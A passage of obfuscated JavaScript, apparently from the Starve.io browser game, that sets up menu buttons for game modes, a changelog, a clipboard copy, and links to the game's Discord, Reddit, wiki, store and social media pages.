			this.ⵠⵠⲆᐃ[ᐃⲆ] = ΔΔⲆⲆ(ⲆΔ.ΔᐃⵠⵠᐃⲆΔ, ⲆᐃⲆⲆ, -758 / Ⲇᐃⵠᐃ, -ⵠᐃΔⲆ, ⲆΔⵠⲆ | ΔⲆⲆⵠ);
			this.ⵠⵠⲆᐃ[ᐃⲆ++].view = ⵠⵠⵠⲆΔⵠⵠ;
			ΔᐃⵠⵠⵠΔⲆ = ᐃⲆ++;
			this.ⵠⵠⲆᐃ[ΔᐃⵠⵠⵠΔⲆ] = ΔΔⲆⲆ(ⲆΔ.ⵠΔᐃⲆᐃΔⲆ, ⵠⵠᐃΔ, 93, 30, ⲆΔⵠⲆ);
			this.ⵠⵠⲆᐃ[ᐃⲆ] = ΔΔⲆⲆ(ⲆΔ.ᐃΔⲆⲆᐃᐃᐃ, ⲆᐃⲆⲆ, -692 / 4, 110, ⲆΔⵠⲆ | ΔⲆⲆⵠ);
			this.ⵠⵠⲆᐃ[ᐃⲆ++].view = ⲆⲆⲆΔᐃⲆⲆ;
			this.ⵠⵠⲆᐃ[ᐃⲆ] = ΔΔⲆⲆ(ⲆΔ.ᐃᐃΔᐃΔΔᐃ, ⲆᐃⲆⲆ, -692 / ᐃⲆᐃⲆⵠ, 110, ⲆΔⵠⲆ | ΔⲆⲆⵠ);
			this.ⵠⵠⲆᐃ[ᐃⲆ++].view = ⲆⵠᐃⲆⲆⲆᐃ;
			ᐃⲆ = 0;
			this.buttons = [];
			this.buttons[ᐃⲆ] = Δⵠⵠ(50, 57, "", [ⲆΔ.ⲆᐃⲆΔⲆⲆⵠ, ⲆΔ.ⵠᐃᐃⵠⵠⲆⲆ, ⲆΔ.ⵠᐃⵠΔΔⵠⵠ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ᐃᐃᐃ.ᐃΔΔⲆᐃ() ? ⲆΔᐃⵠ(ᐃⲆᐃⵠᐃ) : ⲆΔᐃⵠ(ᐃᐃΔᐃⵠ)
			}), 320, ΔΔⵠⵠ, ΔⲆᐃⵠ, ⵠⵠᐃΔ);
			ᐃⲆ++;
			ᐃⲆᐃΔᐃⵠᐃ.innerWidth < 1300 ? this.buttons[ᐃⲆ] = Δⵠⵠ(202, 97, "", [ⲆΔ.ⲆⲆⲆⲆᐃᐃⲆ, ⲆΔ.ⲆΔⲆᐃⲆⲆᐃ, ⲆΔ.ᐃⲆⲆⵠᐃⲆⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, this.ⲆᐃΔᐃⵠΔⵠ, 462, 235, ⲆΔⵠⲆ | ΔⲆᐃⵠ, ⵠⵠᐃΔ) : this.buttons[ᐃⲆ] = Δⵠⵠ(202, 97, "", [ⲆΔ.ⲆⲆⲆⲆᐃᐃⲆ, ⲆΔ.ⲆΔⲆᐃⲆⲆᐃ, ⲆΔ.ᐃⲆⲆⵠᐃⲆⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, this.ⲆᐃΔᐃⵠΔⵠ, 74, 235, ⲆΔⵠⲆ | ΔⲆⲆⵠ, ⵠⵠᐃΔ);
			this.buttons[ᐃⲆ].view = ⲆⵠΔΔΔ;
			ᐃⲆ++;
			1300 < ᐃⲆᐃΔᐃⵠᐃ.innerWidth && (this.buttons[ᐃⲆ] = Δⵠⵠ(355, 168, "", [ⲆΔ.ⲆᐃⵠΔⵠⵠⲆ, ⲆΔ.ⲆᐃⵠΔⵠⵠⲆ, ⲆΔ.ⲆᐃⵠΔⵠⵠⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[72]]("./changelog.html", ⵠ[513])
			}), -195, -115, ⵠⵠΔⵠᐃⵠⵠ | ΔⲆⲆⵠ, ⵠⵠᐃΔ), this.buttons[ᐃⲆ++].view = ⲆⵠΔΔΔ, this.buttons[ᐃⲆ] = Δⵠⵠ(355, 168, "", [ⲆΔ.ᐃᐃⵠⵠᐃⵠⲆ, ⲆΔ.ᐃᐃⵠⵠᐃⵠⲆ, ⲆΔ.ᐃᐃⵠⵠᐃⵠⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[72]]("https://taming.io", ⵠ[513])
			}), ⵠⵠⲆⲆⲆΔΔ, -115, ⵠⵠΔⵠᐃⵠⵠ | ΔⲆⲆⵠ, ⵠⵠᐃΔ), this.buttons[ᐃⲆ++].view = ⲆⵠΔΔΔ);
			this.buttons[ᐃⲆ++] = Δⵠⵠ(80, 80, "", [ⲆΔ.ᐃᐃᐃΔⲆΔΔ, ⲆΔ.ᐃᐃⲆⵠΔⵠⵠ, ⲆΔ.ΔΔⲆⵠⲆⲆⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[72]]("https://lapamauve.creator-spring.com/", ⵠ[513])
			}), 380, ⲆⵠⲆᐃⲆ, ΔⵠⲆⵠⲆ, ⵠⵠᐃΔ);
			this.buttons[ᐃⲆ++] = Δⵠⵠ(80, 80, "", [ⲆΔ.ᐃΔⲆᐃⲆᐃⵠ, ⲆΔ.ⲆΔⲆΔΔᐃⵠ, ⲆΔ.ᐃⲆⲆⲆᐃΔⵠ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[72]]("https://discord.gg/starveio", ⵠ[513])
			}), 330, 10, ΔⵠⲆⵠⲆ, ⵠⵠᐃΔ);
			this.buttons[ᐃⲆ++] = Δⵠⵠ(80, 80, "", [ⲆΔ.ⵠᐃⵠⲆᐃⵠᐃ, ⲆΔ.ᐃⲆΔⲆⲆᐃᐃ, ⲆΔ.ⲆΔᐃⲆⵠⵠⵠ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[72]]("https://reddit.com/r/starveio", ⵠ[513])
			}), 280, ⵠᐃⲆⲆΔ, ΔⵠⲆⵠⲆ, ⵠⵠᐃΔ);
			this.buttons[ᐃⲆ++] = Δⵠⵠ(80, 80, "", [ⲆΔ.ᐃᐃⵠᐃΔᐃΔ, ⲆΔ.ΔⲆΔΔⵠⲆΔ, ⲆΔ.ᐃᐃᐃⵠΔΔⵠ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[72]]("https://starveiopro.wikia.com/wiki/", ⵠ[513])
			}), 230, 10, ΔⵠⲆⵠⲆ, ⵠⵠᐃΔ);
			this.buttons[ᐃⲆ++] = Δⵠⵠ(80, 80, "", [ⲆΔ.ΔⲆⲆⵠⵠᐃΔ, ⲆΔ.ΔⵠΔΔⵠΔᐃ, ⲆΔ.ΔⵠᐃΔΔΔⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[72]]("https://www.facebook.com/LapaMauve/", ⵠ[513])
			}), 155, ⵠⵠΔⲆᐃ, ΔⵠⲆⵠⲆ, ⵠⵠᐃΔ);
			this.buttons[ᐃⲆ++] = Δⵠⵠ(80, 80, "", [ⲆΔ.ᐃⲆΔⲆⵠΔᐃ, ⲆΔ.ⲆⲆΔⵠᐃⵠⲆ, ⲆΔ.ⵠⲆΔⵠᐃΔᐃ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[72]]("https://twitter.com/lapamauve", ⵠ[513])
			}), 105, 10, ΔⵠⲆⵠⲆ, ⵠⵠᐃΔ);
			this.buttons[ᐃⲆ++] = Δⵠⵠ(80, 80, "", [ⲆΔ.ⲆᐃΔⵠⵠⲆΔ, ⲆΔ.ᐃᐃΔᐃⲆⵠΔ, ⲆΔ.ⵠⵠⵠᐃⲆᐃᐃ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[72]]("https://www.youtube.com/@lapamauveofficial", ⵠ[513])
			}), 55, ⲆⲆᐃΔΔ, ΔⵠⲆⵠⲆ, ⵠⵠᐃΔ);
			ⲆᐃᐃᐃᐃΔΔ = ᐃⲆ++;
			this.buttons[ⲆᐃᐃᐃᐃΔΔ] = Δⵠⵠ(232, 142, "", [ⲆΔ.ᐃⵠᐃⲆⲆΔⲆ, ⲆΔ.ᐃⵠⲆⲆⲆⵠⲆ, ⲆΔ.ⲆᐃⲆⵠⲆΔΔ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ⲆΔᐃⵠ(ᐃⲆⵠⲆⲆ);
				ᐃⲆΔⵠᐃ(ⵠⲆᐃΔ.ᐃΔΔΔⵠᐃⵠ, ⵠⲆᐃΔ.ⵠΔᐃΔⲆᐃᐃ, ⵠⲆᐃΔ.ⲆⲆⵠⲆⲆⵠᐃ, ⵠⲆᐃΔ.ΔⵠΔⲆᐃΔⵠ)
			}), -ᐃΔΔⲆ, 573, ΔⲆᐃⵠ, ⵠⵠᐃΔ);
			this.buttons[ᐃⲆ++] = Δⵠⵠ(236, 165, "", [ⲆΔ.ΔᐃⲆΔⵠⲆⲆ, ⲆΔ.ΔᐃⲆΔⵠⲆⲆ, ⲆΔ.ΔᐃⲆΔⵠⲆⲆ], ᐃΔⲆⵠ, ᐃⵠⲆⵠⲆⵠⲆ, (function() {
				ⲆΔᐃⵠ(ᐃⲆⵠⲆⲆ)
			}), -ΔⲆΔΔ, 566, ΔⲆᐃⵠ, ⵠⵠᐃΔ);
			ⵠⵠᐃΔΔⲆⲆ = ᐃⲆ++;
			this.buttons[ⵠⵠᐃΔΔⲆⲆ] = Δⵠⵠ(236, 165, "", [ⲆΔ.ⵠⲆⲆᐃᐃⵠⵠ, ⲆΔ.Δᐃᐃᐃᐃᐃⵠ, ⲆΔ.ⵠᐃᐃⲆΔᐃᐃ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ⲆΔᐃⵠ(ᐃᐃᐃⲆᐃᐃⵠ)
			}), -5, 494, ΔⲆᐃⵠ, ⵠⵠᐃΔ);
			this.buttons[ᐃⲆ++] = Δⵠⵠ(236, 165, "", [ⲆΔ.ΔⲆᐃᐃΔΔⵠ, ⲆΔ.ΔⲆᐃᐃΔΔⵠ, ⲆΔ.ΔⲆᐃᐃΔΔⵠ], ᐃΔⲆⵠ, ᐃⵠⲆⵠⲆⵠⲆ, (function() {
				ⲆΔᐃⵠ(ᐃᐃᐃⲆᐃᐃⵠ)
			}), -5, 494, ΔⲆᐃⵠ, ⵠⵠᐃΔ);
			ΔΔΔⲆⲆΔΔ = ᐃⲆ++;
			this.buttons[ΔΔΔⲆⲆΔΔ] = Δⵠⵠ(236, 165, "", [ⲆΔ.ⵠⲆⲆᐃᐃⵠⵠ, ⲆΔ.Δᐃᐃᐃᐃᐃⵠ, ⲆΔ.ⵠᐃᐃⲆΔᐃᐃ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				if (ᐃᐃᐃ.ᐃΔΔⲆᐃ()) {
					if (ⵠⲆᐃΔ.ⲆⲆᐃΔΔᐃⵠ - Date.now() > 0) ⲆΔᐃⵠ(ⵠᐃⲆⵠⵠ);
					else ⲆΔᐃⵠ(ᐃⲆᐃⵠⲆ)
				} else ⲆΔᐃⵠ(ᐃᐃΔᐃⵠ)
			}), -5, 415, ΔⲆᐃⵠ, ⵠⵠᐃΔ);
			this.buttons[ᐃⲆ++] = Δⵠⵠ(236, 165, "", [ⲆΔ.Δⵠⵠᐃⵠⵠᐃ, ⲆΔ.Δⵠⵠᐃⵠⵠᐃ, ⲆΔ.Δⵠⵠᐃⵠⵠᐃ], ᐃΔⲆⵠ, ᐃⵠⲆⵠⲆⵠⲆ, (function() {
				if (ᐃᐃᐃ.ᐃΔΔⲆᐃ()) {
					ⵠⲆᐃΔ.ⲆⲆᐃΔΔᐃⵠ - Date.now() > ΔᐃΔΔ ? ⲆΔᐃⵠ(ⵠᐃⲆⵠⵠ) : ⲆΔᐃⵠ(ᐃⲆᐃⵠⲆ)
				} else ⲆΔᐃⵠ(ᐃᐃΔᐃⵠ)
			}), -5, 415, ΔⲆᐃⵠ, ⵠⵠᐃΔ);
			ⵠⲆⲆⲆⵠⲆᐃ = ᐃⲆ++;
			this.buttons[ⵠⲆⲆⲆⵠⲆᐃ] = Δⵠⵠ(236, 165, "", [ⲆΔ.ⵠⲆⲆᐃᐃⵠⵠ, ⲆΔ.Δᐃᐃᐃᐃᐃⵠ, ⲆΔ.ⵠᐃᐃⲆΔᐃᐃ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ⲆΔᐃⵠ(ΔᐃⵠⵠΔ)
			}), -ⵠⵠΔΔ, 336, ΔⲆᐃⵠ, ⵠⵠᐃΔ);
			this.buttons[ᐃⲆ++] = Δⵠⵠ(236, 165, "", [ⲆΔ.ᐃᐃΔᐃᐃᐃⲆ, ⲆΔ.ᐃᐃΔᐃᐃᐃⲆ, ⲆΔ.ᐃᐃΔᐃᐃᐃⲆ], ᐃΔⲆⵠ, ᐃⵠⲆⵠⲆⵠⲆ, (function() {
				ⲆΔᐃⵠ(ΔᐃⵠⵠΔ)
			}), -5, 336, ΔⲆᐃⵠ, ⵠⵠᐃΔ);
			ᐃⵠⲆⲆΔⵠⲆ = ᐃⲆ++;
			this.buttons[ᐃⵠⲆⲆΔⵠⲆ] = Δⵠⵠ(236, 165, "", [ⲆΔ.ⵠⲆⲆᐃᐃⵠⵠ, ⲆΔ.Δᐃᐃᐃᐃᐃⵠ, ⲆΔ.ⵠᐃᐃⲆΔᐃᐃ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ⲆΔᐃⵠ(ⲆΔⵠⵠΔ)
			}), -5, 257, ΔⲆᐃⵠ, ⵠⵠᐃΔ);
			this.buttons[ᐃⲆ++] = Δⵠⵠ(236, 165, "", [ⲆΔ.ΔΔΔᐃⲆⵠᐃ, ⲆΔ.ΔΔΔᐃⲆⵠᐃ, ⲆΔ.ΔΔΔᐃⲆⵠᐃ], ᐃΔⲆⵠ, ᐃⵠⲆⵠⲆⵠⲆ, (function() {
				ⲆΔᐃⵠ(ⲆΔⵠⵠΔ)
			}), -5, 257, ΔⲆᐃⵠ, ⵠⵠᐃΔ);
			ᐃⵠⲆΔⵠⲆᐃ = ᐃⲆ++;
			this.buttons[ᐃⵠⲆΔⵠⲆᐃ] = Δⵠⵠ(236, 165, "", [ⲆΔ.ⵠⲆⲆᐃᐃⵠⵠ, ⲆΔ.Δᐃᐃᐃᐃᐃⵠ, ⲆΔ.ⵠᐃᐃⲆΔᐃᐃ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ⲆΔᐃⵠ(ⲆⵠΔΔΔ)
			}), -5, 178, ΔⲆᐃⵠ, ⵠⵠᐃΔ);
			this.buttons[ᐃⲆ++] = Δⵠⵠ(236, 165, "", [ⲆΔ.ⵠᐃᐃΔᐃᐃΔ, ⲆΔ.ⵠᐃᐃΔᐃᐃΔ, ⲆΔ.ⵠᐃᐃΔᐃᐃΔ], ᐃΔⲆⵠ, ᐃⵠⲆⵠⲆⵠⲆ, (function() {
				ⲆΔᐃⵠ(ⲆⵠΔΔΔ)
			}), -ⵠᐃⲆΔ, 178, ΔⲆᐃⵠ, ⵠⵠᐃΔ);
			ᐃⵠⲆΔⵠⲆⵠ = ᐃⲆ++;
			this.ᐃⵠⲆΔⵠⲆⵠ = ᐃⵠⲆΔⵠⲆⵠ;
			this.buttons[ᐃⵠⲆΔⵠⲆⵠ] = Δⵠⵠ(324, 222, "", [ⲆΔ.ᐃΔᐃᐃⲆⵠⲆ, ⲆΔ.ΔⲆⵠⲆᐃⵠΔ, ⲆΔ.ⵠᐃΔΔⵠᐃⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ⲆΔᐃⵠ(ᐃᐃΔᐃⵠ)
			}), Δᐃᐃᐃ, 70, ΔⲆᐃⵠ, ⵠⵠᐃΔ);
			ΔⲆᐃΔⵠⲆᐃ = ᐃⲆ++;
			ⲆᐃᐃᐃΔᐃⵠ = ᐃⲆ++;
			this.ΔⲆᐃΔⵠⲆᐃ = ΔⲆᐃΔⵠⲆᐃ;
			this.ⲆᐃᐃᐃΔᐃⵠ = ⲆᐃᐃᐃΔᐃⵠ;
			this.buttons[ΔⲆᐃΔⵠⲆᐃ] = Δⵠⵠ(324, 222, "", [ⲆΔ.ΔⵠⵠⵠⲆⵠⲆ, ⲆΔ.ᐃⵠΔΔΔᐃⲆ, ⲆΔ.ⵠΔΔⵠᐃⵠⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ⲆΔᐃⵠ(Ⲇⵠᐃⵠᐃ);
				ᐃⲆⵠΔΔ(-ᐃⲆᐃ)
			}), 0, 70, ΔⲆᐃⵠ, ⲆᐃⲆⲆ);
			this.buttons[ⲆᐃᐃᐃΔᐃⵠ] = Δⵠⵠ(324, 222, "", [ⲆΔ.ᐃΔⵠᐃⲆⲆⵠ, ⲆΔ.ᐃΔⵠᐃⲆⲆⵠ, ⲆΔ.ᐃΔⵠᐃⲆⲆⵠ], ᐃΔⲆⵠ, ᐃⵠⲆⵠⲆⵠⲆ, (function() {
				ⲆΔᐃⵠ(Ⲇⵠᐃⵠᐃ);
				ᐃⲆⵠΔΔ(-ᐃᐃⵠ)
			}), ΔΔⵠⵠ, 70, ΔⲆᐃⵠ, ⲆᐃⲆⲆ);
			if (ΔⵠⲆᐃ.ⲆⵠⵠⲆⵠᐃΔ === 0) {
				var ⲆᐃΔΔⵠ = ᐃⲆ++;
				if (1300 > ᐃⲆᐃΔᐃⵠᐃ.innerWidth) this.buttons[ⲆᐃΔΔⵠ] = Δⵠⵠ(266, 176, "", [ⲆΔ.ⵠⲆᐃⵠⲆⲆⲆ, ⲆΔ.ΔᐃⲆⵠⵠΔᐃ, ⲆΔ.ᐃΔΔⲆⲆⵠⵠ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
					ΔⵠⲆᐃ.ᐃⲆΔᐃᐃ(ΔᐃᐃΔ.ⵠⵠⵠⵠⲆ)
				}), 150, 300, ΔⲆᐃⵠ | ⲆΔⵠⲆ, ⵠⵠᐃΔ);
				else this.buttons[ⲆᐃΔΔⵠ] = Δⵠⵠ(266, 176, "", [ⲆΔ.ⵠⲆᐃⵠⲆⲆⲆ, ⲆΔ.ΔᐃⲆⵠⵠΔᐃ, ⲆΔ.ᐃΔΔⲆⲆⵠⵠ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
					ΔⵠⲆᐃ.ᐃⲆΔᐃᐃ(ΔᐃᐃΔ.ⵠⵠⵠⵠⲆ)
				}), -340, 100, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⵠⵠᐃΔ);
				this.buttons[ⲆᐃΔΔⵠ].view = ⲆⵠΔΔΔ;
				this.buttons[ⲆᐃΔΔⵠ].hint = ⵠΔⲆⵠ;
				var ⵠⲆᐃⲆΔ = ᐃⲆ++;
				if (ᐃⲆᐃΔᐃⵠᐃ.innerWidth < 1300) this.buttons[ⵠⲆᐃⲆΔ] = Δⵠⵠ(266, 176, "", [ⲆΔ.ⲆⵠΔⲆΔᐃⲆ, ⲆΔ.ᐃⲆΔⲆΔᐃⲆ, ⲆΔ.ⵠⲆΔⵠⵠⲆΔ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
					ΔⵠⲆᐃ.ᐃⲆΔᐃᐃ(ΔᐃᐃΔ.ⲆⲆⵠⵠⲆ)
				}), 150, 400, ΔⲆᐃⵠ | ⲆΔⵠⲆ, ⵠⵠᐃΔ);
				else this.buttons[ⵠⲆᐃⲆΔ] = Δⵠⵠ(266, 176, "", [ⲆΔ.ⲆⵠΔⲆΔᐃⲆ, ⲆΔ.ᐃⲆΔⲆΔᐃⲆ, ⲆΔ.ⵠⲆΔⵠⵠⲆΔ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
					ΔⵠⲆᐃ.ᐃⲆΔᐃᐃ(ΔᐃᐃΔ.ⲆⲆⵠⵠⲆ)
				}), -340, 200, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⵠⵠᐃΔ);
				this.buttons[ⵠⲆᐃⲆΔ].view = ⲆⵠΔΔΔ;
				this.buttons[ⵠⲆᐃⲆΔ].hint = ⵠᐃⲆᐃ;
				var ᐃⲆΔⵠⵠ = ᐃⲆ++;
				if (1300 > ᐃⲆᐃΔᐃⵠᐃ.innerWidth) this.buttons[ᐃⲆΔⵠⵠ] = Δⵠⵠ(266, 176, "", [ⲆΔ.Δⵠⵠᐃᐃᐃᐃ, ⲆΔ.ⲆᐃΔΔⵠΔΔ, ⲆΔ.ΔⲆᐃᐃⵠⵠⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
					ΔⵠⲆᐃ.ᐃⲆΔᐃᐃ(ΔᐃᐃΔ.ᐃⲆΔⵠⵠ)
				}), 450, 300, ΔⲆᐃⵠ | ⲆΔⵠⲆ, ⵠⵠᐃΔ);
				else this.buttons[ᐃⲆΔⵠⵠ] = Δⵠⵠ(266, 176, "", [ⲆΔ.Δⵠⵠᐃᐃᐃᐃ, ⲆΔ.ⲆᐃΔΔⵠΔΔ, ⲆΔ.ΔⲆᐃᐃⵠⵠⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
					ΔⵠⲆᐃ.ᐃⲆΔᐃᐃ(ΔᐃᐃΔ.ᐃⲆΔⵠⵠ)
				}), -340, 300, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⵠⵠᐃΔ);
				this.buttons[ᐃⲆΔⵠⵠ].view = ⲆⵠΔΔΔ;
				this.buttons[ᐃⲆΔⵠⵠ].hint = 0;
				var ᐃⲆⵠΔᐃ = ᐃⲆ++;
				if (1300 > ᐃⲆᐃΔᐃⵠᐃ.innerWidth) this.buttons[ᐃⲆⵠΔᐃ] = Δⵠⵠ(266, 176, "", [ⲆΔ.ᐃⵠᐃᐃⲆⵠᐃ, ⲆΔ.ⲆⲆⵠⵠᐃΔⲆ, ⲆΔ.ⲆⵠΔΔⲆⲆⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
					ΔⵠⲆᐃ.ᐃⲆΔᐃᐃ(ΔᐃᐃΔ.ⵠᐃᐃⲆᐃ)
				}), 300, 300, ΔⲆᐃⵠ | ⲆΔⵠⲆ, ⵠⵠᐃΔ);
				else this.buttons[ᐃⲆⵠΔᐃ] = Δⵠⵠ(266, 176, "", [ⲆΔ.ᐃⵠᐃᐃⲆⵠᐃ, ⲆΔ.ⲆⲆⵠⵠᐃΔⲆ, ⲆΔ.ⲆⵠΔΔⲆⲆⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
					ΔⵠⲆᐃ.ᐃⲆΔᐃᐃ(ΔᐃᐃΔ.ⵠᐃᐃⲆᐃ)
				}), 204, ⲆᐃᐃΔⵠᐃΔ, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⵠⵠᐃΔ);
				this.buttons[ᐃⲆⵠΔᐃ].view = ⲆⵠΔΔΔ;
				this.buttons[ᐃⲆⵠΔᐃ].hint = 0;
				var ᐃⵠⲆΔⵠ = ᐃⲆ++;
				1300 > ᐃⲆᐃΔᐃⵠᐃ.innerWidth ? this.buttons[ᐃⵠⲆΔⵠ] = Δⵠⵠ(266, 176, "", [ⲆΔ.ⵠⵠΔᐃⵠⲆⵠ, ⲆΔ.ᐃᐃᐃΔⲆΔⲆ, ⲆΔ.ΔᐃᐃᐃΔⵠΔ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
					ΔⵠⲆᐃ.ᐃⲆΔᐃᐃ(ΔᐃᐃΔ.ⲆⵠΔⵠᐃ)
				}), 300, 400, ΔⲆᐃⵠ | ⲆΔⵠⲆ, ⵠⵠᐃΔ) : this.buttons[ᐃⵠⲆΔⵠ] = Δⵠⵠ(266, 176, "", [ⲆΔ.ⵠⵠΔᐃⵠⲆⵠ, ⲆΔ.ᐃᐃᐃΔⲆΔⲆ, ⲆΔ.ΔᐃᐃᐃΔⵠΔ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
					ΔⵠⲆᐃ.ᐃⲆΔᐃᐃ(ΔᐃᐃΔ.ⲆⵠΔⵠᐃ)
				}), 204, 200, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⵠⵠᐃΔ);
				this.buttons[ᐃⵠⲆΔⵠ].view = ⲆⵠΔΔΔ;
				this.buttons[ᐃⵠⲆΔⵠ].hint = 0;
				var ⵠⵠⲆⲆⲆ = ᐃⲆ++;
				this.buttons[ⵠⵠⲆⲆⲆ] = Δⵠⵠ(266, 176, "", [ⲆΔ.ⵠⲆΔⵠⲆᐃⲆ, ⲆΔ.ΔᐃⵠᐃⵠⲆΔ, ⲆΔ.ΔΔᐃⵠⲆΔΔ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
					ΔⵠⲆᐃ.ᐃⲆΔᐃᐃ(ΔᐃᐃΔ.ⵠⵠⲆⲆⲆ)
				}), ᐃⲆᐃΔᐃⵠᐃ.innerWidth < 1300 ? 450 : 204, ᐃⲆᐃΔᐃⵠᐃ.innerWidth < 1300 ? 400 : 300, (ᐃⲆᐃΔᐃⵠᐃ.innerWidth < 1300 ? ΔⲆᐃⵠ : ΔⲆⲆⵠ) | ⲆΔⵠⲆ, ⵠⵠᐃΔ);
				this.buttons[ⵠⵠⲆⲆⲆ].view = ⲆⵠΔΔΔ;
				this.buttons[ⵠⵠⲆⲆⲆ].hint = Ⲇᐃⵠⵠ
			}
			this.buttons[ᐃⲆ] = Δⵠⵠ(87, 78, "", [ⲆΔ.ᐃⲆΔᐃᐃΔⵠ, ⲆΔ.ⵠᐃⵠⵠⲆΔᐃ, ⲆΔ.ⲆⲆᐃᐃⲆⵠΔ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ⵠⲆᐃΔ.ⵠΔᐃᐃᐃⲆⵠⵠⵠ();
				if (0 === ⵠⲆᐃΔ.ΔᐃΔᐃⵠⵠⲆ) ⲆΔᐃⵠ(ⲆⵠᐃⲆⲆⲆᐃ);
				else ⲆΔᐃⵠ(ⲆⲆⲆΔᐃⲆⲆ)
			}), 127, 110, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = Ⲇⵠᐃⵠᐃ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(87, 78, "", [ⲆΔ.ⵠⵠᐃⵠⲆΔᐃ, ⲆΔ.ⲆᐃᐃΔΔΔⵠ, ⲆΔ.ᐃᐃΔⲆᐃᐃⵠ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				const ᐃᐃΔⲆᐃ = ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[94]][ΔᐃⲆⵠⲆⵠΔ[224]]("textarea");
				ᐃᐃΔⲆᐃ.value = ΔⵠΔⲆᐃ;
				ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[94]][ΔᐃⲆⵠⲆⵠΔ[170]][ΔᐃⲆⵠⲆⵠΔ[242]](ᐃᐃΔⲆᐃ);
				ᐃᐃΔⲆᐃ.select();
				ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[94]][ΔᐃⲆⵠⲆⵠΔ[143]]("copy");
				ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[94]][ΔᐃⲆⵠⲆⵠΔ[170]][ΔᐃⲆⵠⲆⵠΔ[246]](ᐃᐃΔⲆᐃ)
			}), 182, 110, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = Ⲇⵠᐃⵠᐃ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(87, 78, "", [ⲆΔ.ⵠⲆᐃⵠΔᐃⲆ, ⲆΔ.ᐃⵠΔΔⵠΔⲆ, ⲆΔ.ⲆᐃᐃⵠΔⲆᐃ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ᐃΔⵠⲆᐃⲆᐃΔⵠ()
			}), ⲆΔⲆᐃΔⲆᐃ, 110, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = Ⲇⵠᐃⵠᐃ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(58, 64, "", [ⲆΔ.ᐃⲆⵠⲆⵠⵠΔ, ⲆΔ.ⲆᐃᐃⲆⵠⵠᐃ, ⲆΔ.ⲆⲆⵠΔⵠⵠΔ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ⲆΔᐃⵠ(ⲆⵠΔΔΔ)
			}), 189, 118, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃᐃΔᐃⵠ;
